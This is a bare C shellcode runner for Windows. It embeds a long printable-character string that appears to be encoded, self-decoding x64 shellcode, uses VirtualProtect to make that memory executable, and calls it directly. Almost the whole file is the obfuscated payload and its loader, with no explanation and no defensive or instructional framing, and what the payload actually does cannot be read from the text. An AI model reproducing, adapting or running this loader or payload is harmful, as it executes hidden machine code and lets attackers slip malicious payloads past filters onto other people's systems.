#include <windows.h>
#include <stdio.h>
#include <string.h>

int main() {
    char *aaa = \
    "PQRSVWh4321XH-5321P4/P^YQ1L40ZQ1L44_T[WXH56>X%H5YQ7JPhFrnQXH5)+6m1D"
    "440L440L47hc3?uXH5;{KiPf1L42h5myoXH5j3\"51D44hl|v*XH5-%7rPh*6e<XH5t"
    "l<g1D44hy\\r&XH5R>3zPf1L40h~3\"6XH5?hcl1D44WXH5Spq!H5SM9]P0L42h%~(="
    "XH56^i=1D440L440L47h,JL}XH5I2)-Phu#r5XH5=Ul}1D44f1L45hq420XH5#|uSP0"
    "L42hF95pXH5'UV^1D44h]nsNXH5\\H:8P0L410L43hsxWyXH5@0fT1D440L440L47h/"
    "bk2XH5[n!sP0L40h-NFgXH5YB1+1D440L440L46h2KOKXH5D#qwP0L40h7J$rXH5BbB"
    "31D440L45RXH5)FA9H5hGz-Pf1L42hjs+=XH5g2U>1D440L45h-NPVXH5Vq$_Pf1L40"
    "h5^t!XH5t`G01D44f1L45hW|jZXH5v4[eP0L400L43hgAy{XH5*pb(1D44f1L46WXH5"
    "bji-H5b\\(YP0L42hAY9oXH5u/un1D440L45h%qiyXH5oe!HPh@P`|XH5I7|-1D440L"
    "440L46hB*rkXH5fgsNP0L43h'TM[XH5oe{/1D44f1L46h0}+lXH51[f]P0L41hi.?<X"
    "H5DjKn1D440L440L46h0M{rXH5}|M6P0L42h.'B,XH5Zmba1D440L44hLy6iXH5s=B+"
    "P0L400L42hi`6\\XH5u-7{1D440L47hC)o7XH57=d{P0L40hIyw]XH5H\\:l1D440L4"
    "5RXH58UZ\"H5tT~jP0L42hKqvNXH5zG891D440L44h*g.,XH5qGgZP0L43hwX}vXH5S"
    ",&J1D44f1L44h.05}XH5fD.5P0L41hRgz-XH5&|2Y1D440L440L47hv7owXH5>C4oP0"
    "L41h}8nZXH55L5z1D440L45h'h~#XH5oYZFP0L42h>-1%XH5vYjE1D440L45hn$i.XH"
    "5?e;oPhefv.XH56'\"M1D440L47hjy}0XH5:*,bPh($a<XH5~e1}1D44\xff\xe4";

    int oldp;
    VirtualProtect(aaa, (unsigned int)strlen(aaa), PAGE_EXECUTE_READWRITE, &oldp);
    ((void(*)())aaa)();
    return 0;
}